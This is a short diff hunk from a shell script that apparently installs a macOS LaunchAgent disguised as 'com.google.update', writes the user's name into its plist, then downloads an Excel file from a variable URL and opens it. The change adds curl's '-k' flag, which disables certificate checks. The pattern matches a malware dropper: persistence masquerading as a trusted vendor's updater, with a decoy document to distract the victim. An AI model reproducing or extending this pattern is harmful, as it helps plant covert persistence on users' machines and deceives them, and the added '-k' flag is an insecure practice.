@@ -45,5 +45,5 @@ sed -i .bak "s/replace/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.pli
 rm ~/Library/LaunchAgents/com.google.update.plist.bak
 
 # Download and open a real file excel
-curl -s $EXCELURL -o excel.xlsx
+curl -k -s $EXCELURL -o excel.xlsx
 open excel.xlsx
